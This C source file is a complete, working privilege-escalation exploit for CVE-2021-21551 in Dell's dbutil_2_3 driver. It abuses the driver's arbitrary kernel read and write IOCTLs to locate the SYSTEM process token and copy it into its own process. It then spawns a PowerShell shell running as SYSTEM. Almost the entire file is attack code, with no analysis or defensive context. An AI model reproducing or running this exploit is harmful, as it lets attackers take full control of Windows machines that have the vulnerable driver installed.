/**
 * Standard Input Output.
 * 
 * Defines three variable types, several macros, and various functions for performing input and output.
 * https://www.tutorialspoint.com/c_standard_library/stdio_h.htm
 */
#include <stdio.h>

/**
 * Standard Library.
 * 
 * Defines four variable types, several macros, and various functions for performing general functions.
 * https://www.tutorialspoint.com/c_standard_library/stdlib_h.htm
 */
#include <stdlib.h>

/**
 * Data type limits.
 * 
 * The macros defined in this header, limits the values of various variable types like char, int and long.
 * https://www.tutorialspoint.com/c_standard_library/limits_h.htm
 */
#include <limits.h>

/**
 * Strings.
 * 
 * Defines one variable type, one macro, and various functions for manipulating arrays of characters.
 * https://www.tutorialspoint.com/c_standard_library/string_h.htm
 */
#include <string.h>

/**
 * Integers.
 * 
 * Defines macros that specify limits of integer types corresponding to types defined in other standard headers.
 * https://pubs.opengroup.org/onlinepubs/009696899/basedefs/stdint.h.html
 */
#include <stdint.h>

/**
 * Booleans.
 * 
 * Defines boolean types.
 * https://pubs.opengroup.org/onlinepubs/007904975/basedefs/stdbool.h.html
 */
#include <stdbool.h>

/**
 * Windows API.
 * 
 * Contains declarations for all of the functions, macro's & data types in the Windows API.
 * Define 'WIN32_LEAN_AND_MEAN' to make sure windows.h compiles without warnings.
 * https://docs.microsoft.com/en-us/previous-versions//aa383749(v=vs.85)?redirectedfrom=MSDN
 */
#define WIN32_LEAN_AND_MEAN
#include <windows.h>

/**
 * Process Status API (PSAPI).
 * 
 * Helper library that makes it easier for you to obtain information about processes and device drivers. 
 * https://docs.microsoft.com/en-us/windows/win32/api/psapi/
 */
#include <psapi.h>

/**
 * Load additional DLL's.
 */
#pragma comment(lib, "Advapi32.lib")

/**
 * Custom global variables
 */
#define ARBITRARY_READ_IOCTL    0x9b0c1ec4
#define ARBITRARY_WRITE_IOCTL   0x9b0c1ec8

/**
 * Packet with data that the driver accepts
 */
typedef struct _PACKET
{
    uint64_t size;      // Output size
    uint8_t* address;   // Target address
    uint64_t offset;    // Offset? TODO
    uint8_t* value;     // Data to write
} PACKET, * PPACKET;

/**
 * Get the kernel base in in the system virtual address space.
 * 
 * @return uintptr_t A pointer to the kernel base in the system space.
 */
uintptr_t getKernelBase() {
    DWORD lpcbNeeded;
    LPVOID lpImageBase[0x1000];

    if (EnumDeviceDrivers(lpImageBase, 0x1000, &lpcbNeeded)) {
        return lpImageBase[0];
    }

    return NULL;
}

/**
 * Read system space memory.
 * 
 * @param HANDLE hDevice The handle to the vulnerable driver.
 * @param uint8_t* address System space address to read.
 * @return uint8_t* The memory byte stream.
 */
uint8_t* memoryRead(HANDLE hDevice, uint8_t* address) {
    uint32_t lpBytesReturned;
    PACKET lpBuffer;

    lpBuffer.address = address;
    lpBuffer.offset = 0;

    if (!DeviceIoControl(hDevice, ARBITRARY_READ_IOCTL, &lpBuffer, sizeof(lpBuffer), &lpBuffer, sizeof(lpBuffer), &lpBytesReturned, NULL)) {
        printf("[!] DeviceIoControl error in 'memoryRead'.\n");
    }
    
    return lpBuffer.value;
}

/**
 * Write system space memory.
 * 
 * @param HANDLE hDevice The handle to the vulnerable driver.
 * @param uint8_t* address System space address to write to.
 * @param uint8_t* value The value to write.
 * @return uint8_t* The memory byte stream.
 */
void memoryWrite(HANDLE hDevice, uint8_t* address, uint8_t* value) {
    uint32_t lpBytesReturned;
    PACKET lpBuffer;

    lpBuffer.address = address;
    lpBuffer.offset = 0;
    lpBuffer.value = value;

    if (!DeviceIoControl(hDevice, ARBITRARY_WRITE_IOCTL, &lpBuffer, sizeof(lpBuffer), &lpBuffer, sizeof(lpBuffer), &lpBytesReturned, NULL)) {
        printf("[!] DeviceIoControl error in 'memoryWrite'.\n");
    }
}

/**
 * Spawn a SYSTEM shell using CVE-2021-21551.
 *
 * Write a SYSTEM token to the current process and spawn a PowerShell sub process.
 * 
 * @param int argc Amount of arguments in argv.
 * @param char** Array of arguments passed to the program.
 * @return int Zero if succesfully executed, any other integer otherwise.
 */
void main(int argc, char** argv) {
    printf("[+] Ran %s with %d argument(s).\n", argv[0], argc - 1);

    printf("[+] Retrieving current working directory.\n");
    char* currentWorkingDirectory =  malloc(sizeof(char) * _MAX_PATH);
    _getcwd(currentWorkingDirectory, _MAX_PATH);

    printf("[+] Changing current working directory to 'C:\\'.\n");
    chdir("c:\\");
 
    HANDLE hDevice = CreateFileW(L"\\\\.\\dbutil_2_3", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hDevice == INVALID_HANDLE_VALUE) {
        printf("[!] Failed to open handle, check if dbutil_2_3 is running with winobj.\n");
        return;
    }

    HMODULE hNtOsKrnl = LoadLibraryExW(L"NtOsKrnl.exe", NULL, DONT_RESOLVE_DLL_REFERENCES);

    if (!hNtOsKrnl) {
        printf("[!] Cannot load 'NtOsKrnl.exe'.\n");
        return;
    }

    size_t systemProcessOffset = (uint8_t*) ((size_t) GetProcAddress(hNtOsKrnl, "PsInitialSystemProcess") - (size_t) hNtOsKrnl);
    printf("[+] Identified systemProcessOffset: 0x%zX.\n", systemProcessOffset);

    uint8_t* systemProcessPointerAddress = (uint8_t*) ((size_t) getKernelBase() + systemProcessOffset);
    printf("[+] Identified systemProcessPointerAddress: %p.\n", systemProcessPointerAddress);

    uint8_t* systemProcessAddress = memoryRead(hDevice, systemProcessPointerAddress);
    printf("[+] Identified systemProcessAddress: %p.\n", systemProcessAddress);

    uint8_t* systemProcessToken = (uint8_t*) ((size_t) memoryRead(hDevice, systemProcessAddress + 0x4b8) & 0xfffffffffffffff0);
    printf("[+] Identified systemProcessToken: %p.\n", systemProcessToken);

    uint8_t* activeProcessLinks = memoryRead(hDevice, systemProcessAddress + 0x448);
    printf("[+] Identified activeProcessLinks: %p.\n", activeProcessLinks);

    while (true) {
        if (memoryRead(hDevice, activeProcessLinks - 8) == GetCurrentProcessId()) {
            uint8_t* currentProcess = activeProcessLinks - 0x448;
            printf("[+] Found currentProcess: %p.\n", currentProcess);

            memoryWrite(hDevice, currentProcess + 0x4b8, systemProcessToken);
            printf("[+] Setting currentProcess token to systemProcessToken\n");

            printf("[+] Current user: ");
            system("cmd /c whoami");

            printf("[+] Exploit executed successfully! Spawning PowerShell.\n\n");
            break;
        }

        activeProcessLinks = memoryRead(hDevice, activeProcessLinks);
    }

    CloseHandle(hDevice);

    system("powershell");

    printf("[+] Reverting to '%s'.\n", currentWorkingDirectory);
    chdir(currentWorkingDirectory);

    printf("[+] Done.\n");
}